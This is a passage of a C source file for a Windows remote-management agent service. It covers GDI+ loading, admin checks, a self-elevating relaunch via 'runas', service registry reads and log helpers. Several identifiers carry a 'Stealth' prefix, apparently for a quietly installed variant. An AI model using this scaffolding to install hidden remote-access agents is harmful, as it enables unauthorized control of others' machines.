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";

/*
extern int g_TrustedHashSet;
extern char g_TrustedHash[32];
extern char NullNodeId[32];
extern struct PolicyInfoBlock* g_TrustedPolicy;
extern char g_selfid[UTIL_HASHSIZE];
extern struct sockaddr_in6 g_ServiceProxy;
extern char* g_ServiceProxyHost;
extern int g_ServiceConnectFlags;
*/


#include <Shlwapi.h>
#define SmoothingModeAntiAlias 5
#define InterpolationModeBicubic 8


HMODULE _gdip = NULL;
HMODULE _shm = NULL;
typedef int(__stdcall *_GdipCreateBitmapFromStream)(void *stream, void **bitmap);
typedef int(__stdcall *_GdiplusStartup)(void **token, void *input, void *obj);
typedef int(__stdcall *_GdiplusShutdown)(void *token);
typedef IStream*(__stdcall *_SHCreateMemStream)(void *buffer, uint32_t bufferLen);
typedef int(__stdcall *_GdipCreateHBITMAPFromBitmap)(void *bitmap, HBITMAP *hbReturn, int background);
typedef int(__stdcall *_GdipGetImagePixelFormat)(void *image, int *format);
typedef int(__stdcall *_GdipCreateBitmapFromScan0)(int width, int height, int stride, int format, BYTE* scan0, void** bitmap);
typedef int(__stdcall *_GdipGetImageHorizontalResolution)(void *image, float *resolution);
typedef int(__stdcall *_GdipGetImageVerticalResolution)(void *image, float *resolution);
typedef int(__stdcall *_GdipBitmapSetResolution)(void* bitmap, float xdpi, float ydpi);
typedef int(__stdcall *_GdipGetImageGraphicsContext)(void *image, void **graphics);
typedef int(__stdcall *_GdipSetSmoothingMode)(void *graphics, int smoothingMode);
typedef int(__stdcall *_GdipSetInterpolationMode)(void *graphics, int interpolationMode);
typedef int(__stdcall *_GdipDrawImageRectI)(void *graphics, void *image, int x, int y, int width, int height);
typedef int(__stdcall *_GdipDisposeImage)(void *image);

_GdipCreateBitmapFromStream __GdipCreateBitmapFromStream;
_GdipCreateHBITMAPFromBitmap __GdipCreateHBITMAPFromBitmap;
_GdipGetImagePixelFormat __GdipGetImagePixelFormat;
_GdipCreateBitmapFromScan0 __GdipCreateBitmapFromScan0;
_GdipGetImageHorizontalResolution __GdipGetImageHorizontalResolution;
_GdipGetImageVerticalResolution __GdipGetImageVerticalResolution;
_GdipBitmapSetResolution __GdipBitmapSetResolution;
_GdipGetImageGraphicsContext __GdipGetImageGraphicsContext;
_GdipSetSmoothingMode __GdipSetSmoothingMode;
_GdipSetInterpolationMode __GdipSetInterpolationMode;
_GdipDrawImageRectI __GdipDrawImageRectI;
_GdipDisposeImage __GdipDisposeImage;
_GdiplusShutdown __GdiplusShutdown;

_GdiplusStartup __GdiplusStartup;
_SHCreateMemStream __SHCreateMemStream2;
void *GdiPlusToken = NULL;

#if defined _M_IX86
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif

void GdiPlusFlat_Init()
{
	INITCOMMONCONTROLSEX icex;		// declare an INITCOMMONCONTROLSEX Structure
	icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
	icex.dwICC = ICC_BAR_CLASSES | ICC_LISTVIEW_CLASSES | ICC_TAB_CLASSES | ICC_PROGRESS_CLASS;   // This is needed for tooltips  									
	BOOL _ok = InitCommonControlsEx(&icex);

	char input[24] = { 0 };
	_gdip = LoadLibraryExW(L"Gdiplus.dll", NULL, LOAD_LIBRARY_SEARCH_USER_DIRS);
	if (_gdip == NULL) { _gdip = LoadLibraryExW(L"Gdiplus.dll", NULL, 0); }
	if (_gdip == NULL) { return; }
	_shm = LoadLibraryExW(L"Shlwapi.dll", NULL, LOAD_LIBRARY_SEARCH_USER_DIRS);
	if (_shm == NULL) { _shm = LoadLibraryExW(L"Shlwapi.dll", NULL, 0); }
	if (_shm == NULL) { FreeLibrary(_gdip); _gdip = NULL; return; }

	__GdipCreateBitmapFromStream = (_GdipCreateBitmapFromStream)GetProcAddress(_gdip, (LPCSTR)"GdipCreateBitmapFromStream");
	__GdiplusStartup = (_GdiplusStartup)GetProcAddress(_gdip, (LPCSTR)"GdiplusStartup");
	__SHCreateMemStream2 = (_SHCreateMemStream)GetProcAddress(_shm, (LPCSTR)"SHCreateMemStream");
	__GdipCreateHBITMAPFromBitmap = (_GdipCreateHBITMAPFromBitmap)GetProcAddress(_gdip, (LPCSTR)"GdipCreateHBITMAPFromBitmap");
	__GdipGetImagePixelFormat = (_GdipGetImagePixelFormat)GetProcAddress(_gdip, (LPCSTR)"GdipGetImagePixelFormat");
	__GdipCreateBitmapFromScan0 = (_GdipCreateBitmapFromScan0)GetProcAddress(_gdip, (LPCSTR)"GdipCreateBitmapFromScan0");
	__GdipGetImageHorizontalResolution = (_GdipGetImageHorizontalResolution)GetProcAddress(_gdip, (LPCSTR)"GdipGetImageHorizontalResolution");
	__GdipGetImageVerticalResolution = (_GdipGetImageVerticalResolution)GetProcAddress(_gdip, (LPCSTR)"GdipGetImageVerticalResolution");
	__GdipBitmapSetResolution = (_GdipBitmapSetResolution)GetProcAddress(_gdip, (LPCSTR)"GdipBitmapSetResolution");
	__GdipGetImageGraphicsContext = (_GdipGetImageGraphicsContext)GetProcAddress(_gdip, (LPCSTR)"GdipGetImageGraphicsContext");
	__GdipSetSmoothingMode = (_GdipSetSmoothingMode)GetProcAddress(_gdip, (LPCSTR)"GdipSetSmoothingMode");
	__GdipSetInterpolationMode = (_GdipSetInterpolationMode)GetProcAddress(_gdip, (LPCSTR)"GdipSetInterpolationMode");
	__GdipDrawImageRectI = (_GdipDrawImageRectI)GetProcAddress(_gdip, (LPCSTR)"GdipDrawImageRectI");
	__GdipDisposeImage = (_GdipDisposeImage)GetProcAddress(_gdip, (LPCSTR)"GdipDisposeImage");
	__GdiplusShutdown = (_GdiplusShutdown)GetProcAddress(_gdip, (LPCSTR)"GdiplusShutdown");

	((uint32_t*)input)[0] = 1;
	__GdiplusStartup(&GdiPlusToken, input, NULL);
}
void GdiPlusFlat_Release()
{
	if (GdiPlusToken != NULL) { __GdiplusShutdown(GdiPlusToken); GdiPlusToken = NULL; }
	if (_gdip != NULL) { FreeLibrary(_gdip); _gdip = NULL; }
	if (_shm != NULL) { FreeLibrary(_shm); _shm = NULL; }
}

BOOL IsAdmin()
{
	BOOL admin = 0;
	PSID AdministratorsGroup;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

	if ((admin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) != 0)
	{
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &admin)) admin = FALSE;
		FreeSid(AdministratorsGroup);
	}
	return admin;
}

BOOL RunAsAdmin(char* args, int isAdmin)
{
	WCHAR szPath[_MAX_PATH + 100];
	if (GetModuleFileNameW(NULL, szPath, sizeof(szPath) / 2))
	{
		SHELLEXECUTEINFOW sei = { sizeof(sei) };
		sei.hwnd = NULL;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
		sei.nShow = SW_NORMAL;
		sei.lpVerb = isAdmin ? L"open" : L"runas";
		sei.lpFile = szPath;
		sei.lpParameters = ILibUTF8ToWide(args, -1);
		if (ShellExecuteExW(&sei))
		{
			if (sei.hProcess != NULL) { CloseHandle(sei.hProcess); }
			return TRUE;
		}
		return FALSE;
	}
	return FALSE;
}

static BOOL MeshService_AllowStop(void)
{
	wchar_t serviceKeyName[256] = {0};
	wchar_t paramsKeyPath[512];
	DWORD value = 0;
	DWORD cb = sizeof(value);

	// AllowStop is stored under the SCM service key name, not the display name.
	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
	if (serviceKeyName[0] == L'\0')
	{
		StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
	}
	_snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
		L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
	if (RegGetValueW(HKEY_LOCAL_MACHINE, paramsKeyPath, L"AllowStop", RRF_RT_REG_DWORD, NULL, &value, &cb) == ERROR_SUCCESS)
	{
		return (value != 0);
	}
	return FALSE;
}

static BOOL MeshService_GetDirectoryFromPath(const WCHAR* path, WCHAR* directoryOut, size_t directoryOutCch)
{
	size_t len = 0;
	size_t i = 0;

	if (path == NULL || path[0] == L'\0' || directoryOut == NULL || directoryOutCch == 0) { return FALSE; }
	if (FAILED(StringCchCopyW(directoryOut, directoryOutCch, path))) { return FALSE; }

	len = wcslen(directoryOut);
	if (len == 0) { return FALSE; }
	for (i = len; i > 0; --i)
	{
		if (directoryOut[i - 1] == L'\\' || directoryOut[i - 1] == L'/')
		{
			directoryOut[i - 1] = L'\0';
			return TRUE;
		}
	}
	directoryOut[0] = L'\0';
	return FALSE;
}

static BOOL MeshService_IsRecoverableLaunchError(DWORD launchErr)
{
	return (
		launchErr == ERROR_INVALID_FUNCTION ||
		launchErr == ERROR_PROC_NOT_FOUND ||
		launchErr == ERROR_MOD_NOT_FOUND ||
		launchErr == ERROR_BAD_EXE_FORMAT ||
		launchErr == ERROR_FILE_NOT_FOUND ||
		launchErr == ERROR_PATH_NOT_FOUND ||
		launchErr == ERROR_ACCESS_DENIED ||
		launchErr == ERROR_ELEVATION_REQUIRED);
}

static BOOL MeshService_EnsureDirectoryExistsW(const WCHAR* path)
{
	DWORD attrs;

	if (path == NULL || path[0] == L'\0') { return FALSE; }
	attrs = GetFileAttributesW(path);
	if (attrs != INVALID_FILE_ATTRIBUTES)
	{
		return ((attrs & FILE_ATTRIBUTE_DIRECTORY) != 0);
	}

	if (CreateDirectoryW(path, NULL) != FALSE) { return TRUE; }
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		attrs = GetFileAttributesW(path);
		return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0);
	}
	return FALSE;
}

static BOOL MeshService_GetSafeLaunchDirectory(WCHAR* safeDirOut, size_t safeDirOutCch)
{
	UINT len = 0;

	if (safeDirOut == NULL || safeDirOutCch == 0) { return FALSE; }
	safeDirOut[0] = L'\0';
	len = GetSystemDirectoryW(safeDirOut, (UINT)safeDirOutCch);
	if (len == 0 || len >= safeDirOutCch)
	{
		safeDirOut[0] = L'\0';
		return FALSE;
	}
	return TRUE;
}

static BOOL MeshService_BuildSiblingPathWithExtension(const WCHAR* sourcePath, const WCHAR* extension, WCHAR* outPath, size_t outPathCch)
{
	size_t len = 0;

	if (sourcePath == NULL || extension == NULL || outPath == NULL || outPathCch == 0) { return FALSE; }
	outPath[0] = L'\0';
	len = wcslen(sourcePath);
	if (len < 4 || _wcsicmp(sourcePath + (len - 4), L".exe") != 0) { return FALSE; }
	if (FAILED(StringCchCopyW(outPath, outPathCch, sourcePath))) { return FALSE; }
	outPath[len - 4] = L'\0';
	if (FAILED(StringCchCatW(outPath, outPathCch, extension))) { return FALSE; }
	return TRUE;
}

static void MeshService_AppendUserGuiLaunchTrace(const WCHAR* message)
{
	WCHAR localAppData[_MAX_PATH + 100];
	WCHAR traceDir[_MAX_PATH + 160];
	WCHAR tracePath[_MAX_PATH + 220];
	HRESULT hr;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	char utf8Buffer[2048];
	int utf8Len;
	DWORD written = 0;

	if (message == NULL || message[0] == L'\0') { return; }

	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
	if (FAILED(hr)) { return; }
	if (FAILED(StringCchPrintfW(traceDir, _countof(traceDir), L"%ls\\%s", localAppData, STEALTH_FALLBACK_SERVICE_NAME))) { return; }
	if (FAILED(StringCchPrintfW(tracePath, _countof(tracePath), L"%ls\\gui-launch.log", traceDir))) { return; }
	MeshService_EnsureDirectoryExistsW(traceDir);

	hFile = CreateFileW(tracePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) { return; }

	utf8Len = WideCharToMultiByte(CP_UTF8, 0, message, -1, utf8Buffer, (int)sizeof(utf8Buffer), NULL, NULL);
	if (utf8Len > 1)
	{
		WriteFile(hFile, utf8Buffer, (DWORD)(utf8Len - 1), &written, NULL);
		WriteFile(hFile, "\r\n", 2, &written, NULL);
	}
	CloseHandle(hFile);
}

static void MeshService_LogSelfImageIdentity(const WCHAR* modulePath)
{
	WIN32_FILE_ATTRIBUTE_DATA fileData;
	ULARGE_INTEGER fileSize;
	ULARGE_INTEGER lastWriteTicks;
	WCHAR traceLine[1024];

	if (modulePath == NULL || modulePath[0] == L'\0') { return; }

	if (!GetFileAttributesExW(modulePath, GetFileExInfoStandard, &fileData))
	{
		DWORD err = GetLastError();
		Stealth_LogInstallEvent(L"[GUI] self-image path=%ls attrs-error=%lu", modulePath, err);
		if (SUCCEEDED(StringCchPrintfW(traceLine, _countof(traceLine), L"[GUI] self-image path=%ls attrs-error=%lu", modulePath, err)))
		{
			MeshService_AppendUserGuiLaunchTrace(traceLine);
		}
		return;
	}

	fileSize.LowPart = fileData.nFileSizeLow;
	fileSize.HighPart = fileData.nFileSizeHigh;
	lastWriteTicks.LowPart = fileData.ftLastWriteTime.dwLowDateTime;
	lastWriteTicks.HighPart = fileData.ftLastWriteTime.dwHighDateTime;

	Stealth_LogInstallEvent(
		L"[GUI] self-image path=%ls size=%llu lastWriteTicks=%llu",
		modulePath,
		(unsigned long long)fileSize.QuadPart,
		(unsigned long long)lastWriteTicks.QuadPart);
	if (SUCCEEDED(StringCchPrintfW(
